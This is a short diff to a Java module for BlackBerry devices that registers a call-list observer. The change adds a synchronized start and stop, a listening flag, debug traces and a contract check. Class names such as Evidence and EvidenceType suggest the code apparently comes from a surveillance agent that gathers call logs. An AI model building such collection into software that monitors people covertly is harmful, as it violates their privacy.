@@ -13,12 +13,12 @@ import java.util.Date;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
 import blackberry.config.ConfModule;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.interfaces.CallListObserver;
-import blackberry.debug.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
@@ -36,13 +36,27 @@ public final class ModuleCallList extends BaseModule implements
         return "calllist";
     }
 
+    private static boolean listening = false;
 
-    public void actualStart() {
+    public synchronized void actualStart() {
+        //#ifdef DEBUG
+        debug.trace("actualStart");
+        //#endif
+
+        //#ifdef DBC
+        Check.requires(listening == false, "actualStart: already listening");
+        //#endif
+        
         AppListener.getInstance().addCallListObserver(this);
+        listening = true;
     }
 
-    public void actualStop() {
+    public synchronized void actualStop() {
+        //#ifdef DEBUG
+        debug.trace("actualStop");
+        //#endif
         AppListener.getInstance().removeCallListObserver(this);
+        listening = false;
     }
 
     /*
